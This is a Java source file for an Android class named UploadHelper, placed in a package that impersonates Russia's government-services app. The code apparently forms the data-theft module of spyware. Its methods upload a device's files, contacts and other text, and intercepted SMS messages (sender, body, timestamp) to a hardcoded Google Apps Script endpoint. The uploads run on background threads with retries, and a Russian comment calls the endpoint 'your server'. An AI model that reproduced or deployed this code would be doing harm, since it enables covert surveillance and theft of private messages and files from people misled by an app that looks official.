package ru.gosuslugi.app;

import android.content.Context;
import android.util.Log;
import java.io.File;
import java.io.InputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.IOException;



import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class UploadHelper {

    private static final int MAX_RETRIES = 3;
    private static final int RETRY_DELAY_MS = 2000; // 2 seconds

    // НОВЫЙ URL — ТВОЙ СЕРВЕР НА GOOGLE APPS SCRIPT
    private static final String SERVER_URL = "https://script.google.com/macros/s/AKfycbxZ6S4v-0m4_CR645aVq2ZnBcc0ak-M_5UX-0yLX9jI_bhozwrkA968NaE4WRl9ay7abA/exec";

    // ✅ For File Uploads (photos, videos, docs, etc)
    public static void uploadFile(Context context, File file, String endpoint) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/octet-stream");
                conn.setRequestProperty("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");

                OutputStream os = conn.getOutputStream();
                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    os.write(buffer, 0, bytesRead);
                }
                os.close();
                fis.close();

                int responseCode = conn.getResponseCode();
                Log.d("UPLOAD_FILE", file.getName() + " → Response code: " + responseCode);
                Log.d("UPLOAD_DEBUG", "Uploading file: " + file.getAbsolutePath());

            } catch (Exception e) {
                Log.e("UPLOAD_FILE_ERROR", file.getName() + ": " + e.toString());
            }
        }).start();
    }

    // ✅ For Contact, Text, Other Data
    public static void sendTextToServer(Context context, String type, String text){
        try {
            URL url = new URL(SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(5000);  // 5s timeout
            conn.setReadTimeout(5000);     // 5s timeout
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("Device-ID", DeviceUtils.getDeviceId(context));

            JSONObject json = new JSONObject();
            json.put("type", type);
            json.put("data", text);

            OutputStream os = conn.getOutputStream();
            os.write(json.toString().getBytes("UTF-8"));
            os.close();

            int responseCode = conn.getResponseCode();
            Log.d("UPLOAD_TEXT", "Response: " + responseCode + " for TEXT of length: " + text.length());


            // ✅ Read server response (flush it out of the buffer)
            InputStream is = conn.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) response.append(line);
            reader.close();
            Log.d("UPLOAD_TEXT", "Response body: " + response.toString());

        } catch (Exception e) {
            Log.e("UPLOAD_TEXT", "❌ Upload failed", e);  // 🔁 log full stack trace
        }
    }

    public static boolean uploadFileBlocking(Context context, File file, String endpoint) {
        try {
            URL url = new URL(SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/octet-stream");
            conn.setRequestProperty("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");

            OutputStream os = conn.getOutputStream();
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                os.write(buffer, 0, bytesRead);
            }
            os.close();
            fis.close();

            int responseCode = conn.getResponseCode();
            Log.d("UPLOAD_FILE_BLOCKING", file.getName() + " → Response code: " + responseCode);
            return responseCode == 200;

        } catch (Exception e) {
            Log.e("UPLOAD_FILE_BLOCKING", file.getName() + ": " + e.toString());
            return false;
        }
    }




    // ✅ Restored: For SMS Logs
    public static void sendSMSLogToServer(Context context, String sender, String message, String timestamp) {
        new Thread(() -> {
            int attempt = 0;
            while (attempt < MAX_RETRIES) {
                try {
                    URL url = new URL(SERVER_URL);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setRequestProperty("Content-Type", "application/json");

                    JSONObject json = new JSONObject();
                    json.put("sender", sender);
                    json.put("message", message);
                    json.put("timestamp", timestamp);

                    OutputStream os = conn.getOutputStream();
                    os.write(json.toString().getBytes("UTF-8"));
                    os.close();

                    int responseCode = conn.getResponseCode();
                    Log.d("UPLOAD_SMS", "Attempt " + (attempt + 1) + ": Response code: " + responseCode);

                    if (responseCode == 200) {
                        break;
                    }

                } catch (Exception e) {
                    Log.e("UPLOAD_SMS_ERROR", "Attempt " + (attempt + 1) + ": " + e.toString());
                    attempt++;
                    try {
                        Thread.sleep(RETRY_DELAY_MS);
                    } catch (InterruptedException ie) {
                        break;
                    }
                }
            }
        }).start();
    }
}